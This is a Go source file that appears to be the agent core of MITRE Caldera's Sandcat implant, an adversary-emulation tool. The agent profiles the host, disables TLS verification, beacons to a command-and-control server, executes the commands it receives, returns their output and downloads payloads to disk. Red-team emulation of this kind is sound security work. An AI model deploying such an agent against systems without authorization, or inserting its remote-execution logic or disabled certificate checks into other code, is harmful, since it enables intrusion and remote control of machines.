package agent

import (
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"reflect"
	"runtime"
	"time"

	"github.com/mitre/gocat/contact"
	"github.com/mitre/gocat/execute"
	"github.com/mitre/gocat/output"
	"github.com/mitre/gocat/privdetect"
)

type AgentInterface interface {
	Heartbeat()
	Beacon() map[string]interface{}
	Initialize(server string, group string, c2Config map[string]string, enableP2pReceivers bool) error
	RunInstruction(command map[string]interface{}, payloads []string)
	Terminate()
	GetFullProfile() map[string]interface{}
	GetTrimmedProfile() map[string]interface{}
	SetCommunicationChannels(c2Config map[string]string) error
	Display()
	DownloadPayloads(payloads []interface{}) []string
	FetchPayloadBytes(payload string) []byte
}

// Implements AgentInterface
type Agent struct {
	// Profile fields
	server string
	group string
	host string
	username string
	architecture string
	platform string
	location string
	pid int
	ppid int
	executors []string
	privilege string
	exe_name string
	paw string
	initialDelay float64

	// Communication methods
	beaconContact contact.Contact
	heartbeatContact contact.Contact

	// peer-to-peer info
	enableP2pReceivers bool
}

// Set up agent variables.
func (a *Agent) Initialize(server string, group string, c2Config map[string]string, enableP2pReceivers bool, initialDelay int) error {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	host, err := os.Hostname()
	if err != nil {
		return err
	}
	userInfo, err := user.Current()
	if err != nil {
		usernameBytes, err := exec.Command("whoami").CombinedOutput()
		if err != nil {
			a.username = string(usernameBytes)
		} else {
			return err
		}
	} else {
		a.username = userInfo.Username
	}
	a.server = server
	a.group = group
	a.host = host
	a.architecture = runtime.GOARCH
	a.platform = runtime.GOOS
	a.location = os.Args[0]
	a.pid = os.Getpid()
	a.ppid = os.Getppid()
	a.executors = execute.AvailableExecutors()
	a.privilege = privdetect.Privlevel()
	a.exe_name = filepath.Base(os.Args[0])
	a.enableP2pReceivers = enableP2pReceivers
	a.initialDelay = float64(initialDelay)

	// Paw will get initialized after successful beacon.

	// Set up contacts
	return a.SetCommunicationChannels(c2Config)
}

// Returns full profile for agent.
func (a *Agent) GetFullProfile() map[string]interface{} {
	return map[string]interface{}{
		"paw": a.paw,
		"server": a.server,
		"group": a.group,
		"host": a.host,
		"username": a.username,
		"architecture": a.architecture,
		"platform": a.platform,
		"location": a.location,
		"pid": a.pid,
		"ppid": a.ppid,
		"executors": a.executors,
		"privilege": a.privilege,
		"exe_name": a.exe_name,
	}
}

// Return minimal subset of agent profile.
func (a *Agent) GetTrimmedProfile() map[string]interface{} {
	return map[string]interface{}{
		"paw": a.paw,
		"server": a.server,
		"platform": a.platform,
		"host": a.host,
	}
}

// Pings C2 for instructions and returns them.
func (a *Agent) Beacon() map[string]interface{} {
	var beacon map[string]interface{}
	profile := a.GetFullProfile()
	response := a.beaconContact.GetBeaconBytes(profile)
	if response != nil {
		beacon = processBeacon(response)
	} else {
		output.VerbosePrint("[-] beacon: DEAD")
	}
	return beacon
}

// Converts the given data into a beacon with instructions.
func processBeacon(data []byte) map[string]interface{} {
	var beacon map[string]interface{}
	if err := json.Unmarshal(data, &beacon); err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Malformed beacon received: %s", err.Error()))
	} else {
		var commands interface{}
		if err := json.Unmarshal([]byte(beacon["instructions"].(string)), &commands); err != nil {
			output.VerbosePrint(fmt.Sprintf("[-] Malformed beacon instructions received: %s", err.Error()))
		} else {
			output.VerbosePrint("[+] beacon: ALIVE")
			beacon["sleep"] = int(beacon["sleep"].(float64))
			beacon["watchdog"] = int(beacon["watchdog"].(float64))
			beacon["instructions"] = commands
		}
	}
	return beacon
}

func (a *Agent) Heartbeat() {
	// Add any heartbeat functionality here.
}

func (a *Agent) Terminate() {
	// Add any cleanup/termination functionality here.
	output.VerbosePrint("[*] Terminating Sandcat Agent... goodbye.")
}

// Runs a single instruction and send results.
func (a *Agent) RunInstruction(command map[string]interface{}, payloads []string) {
	timeout := int(command["timeout"].(float64))
	result := make(map[string]interface{})
	commandOutput, status, pid := execute.RunCommand(command["command"].(string), payloads, command["executor"].(string), timeout)
	result["id"] = command["id"]
	result["output"] = commandOutput
	result["status"] = status
	result["pid"] = pid
 	a.beaconContact.SendExecutionResults(a.GetTrimmedProfile(), result)
}

// Sets the C2 communication channels for the agent according to the specified C2 configuration map.
// Will default to HTTP if requested C2 is not available or its requirements aren't met. If defaulting
// to HTTP when it is not available,or if no communication channels are available at all, an error will be returned.
func (a *Agent) SetCommunicationChannels(c2Config map[string]string) error {
	if len(contact.CommunicationChannels) > 0 {
		if c2Name, ok := c2Config["c2Name"]; ok {
			if requestedComs, ok := contact.CommunicationChannels[c2Name]; ok {
				if requestedComs.C2RequirementsMet(a.GetFullProfile(), c2Config) {
					a.beaconContact = requestedComs
					a.heartbeatContact = requestedComs
					output.VerbosePrint("[*] Set communication channels for sandcat agent.")
					return nil
				} else {
					output.VerbosePrint("[-] C2 requirements not met! Attempting to default to HTTP.")
					return a.SetDefaultCommunicationChannel(c2Config)
				}
			} else {
				output.VerbosePrint("[-] Requested C2 channel not found. Attempting to default to HTTP.")
				return a.SetDefaultCommunicationChannel(c2Config)
			}
		} else {
			output.VerbosePrint("[-] Invalid C2 Configuration. c2Name not specified. Attempting to default to HTTP.")
			return a.SetDefaultCommunicationChannel(c2Config)
		}
	} else {
		return errors.New("No possible communication channels found.")
	}
}

// Sets backup communication channels in case the requested one isn't available.
// HTTP will be used as the default communication channel. If HTTP isn't available, or if the C2
// requirements are not met, then an error is returned.
func (a *Agent) SetDefaultCommunicationChannel(c2Config map[string]string) error {
	// Default C2 channel is HTTP
	if coms, ok := contact.CommunicationChannels["HTTP"]; ok {
		if coms.C2RequirementsMet(a.GetFullProfile(), c2Config) {
			a.beaconContact = coms
			a.heartbeatContact = coms
			output.VerbosePrint("[*] Defaulted to HTTP as communication channels for sandcat agent.")
			return nil
		} else {
			return errors.New("Default HTTP C2 channel requirements not met.")
		}
	} else {
		return errors.New("Default HTTP C2 channel not available.")
	}
}

// Outputs information about the agent.
func (a *Agent) Display() {
	output.VerbosePrint(fmt.Sprintf("initial delay=%d", int(a.initialDelay)))
	output.VerbosePrint(fmt.Sprintf("server=%s", a.server))
	output.VerbosePrint(fmt.Sprintf("group=%s", a.group))
	output.VerbosePrint(fmt.Sprintf("privilege=%s", a.privilege))
	output.VerbosePrint(fmt.Sprintf("allow p2p receivers=%v", a.enableP2pReceivers))
	output.VerbosePrint(fmt.Sprintf("beacon channel=%s", a.beaconContact.GetName()))
	output.VerbosePrint(fmt.Sprintf("heartbeat channel=%s", a.heartbeatContact.GetName()))
}

// Will download each individual payload listed, write them to disk,
// and will return the full file paths of each downloaded payload.
func (a *Agent) DownloadPayloads(payloads []interface{}) []string {
	var droppedPayloads []string
	availablePayloads := reflect.ValueOf(payloads)
	for i := 0; i < availablePayloads.Len(); i++ {
		payload := availablePayloads.Index(i).Elem().String()
		location := filepath.Join(payload)
		obtainedPayload := false
		if fileExists(location) == false {
			output.VerbosePrint(fmt.Sprintf("[*] Fetching new payload bytes: %s", payload))
			payloadBytes := a.beaconContact.GetPayloadBytes(a.GetTrimmedProfile(), payload)
			if len(payloadBytes) > 0 {
				if err := writePayloadBytes(location, payloadBytes); err != nil {
					output.VerbosePrint(fmt.Sprintf("[-] Error when writing payload bytes: %s", err.Error()))
				} else {
					obtainedPayload = true
				}
			}
		} else {
			obtainedPayload = true
		}
		if obtainedPayload {
			droppedPayloads = append(droppedPayloads, location)
		}
	}
	return droppedPayloads
}

// Will request payload bytes from the C2 for the specified payload and return them.
func (a *Agent) FetchPayloadBytes(payload string) []byte {
	return a.beaconContact.GetPayloadBytes(a.GetTrimmedProfile(), payload)
}

func (a *Agent) InitialDelay() {
	a.Sleep(a.initialDelay)
}

func (a *Agent) Sleep(sleepTime float64) {
	time.Sleep(time.Duration(sleepTime) * time.Second)
}

func (a *Agent) GetPaw() string {
	return a.paw
}

func (a *Agent) SetPaw(paw string) {
	if len(paw) > 0 {
		a.paw = paw
	}
}

func (a *Agent) GetBeaconContact() contact.Contact {
	return a.beaconContact
}

func (a *Agent) GetHeartbeatContact() contact.Contact {
	return a.heartbeatContact
}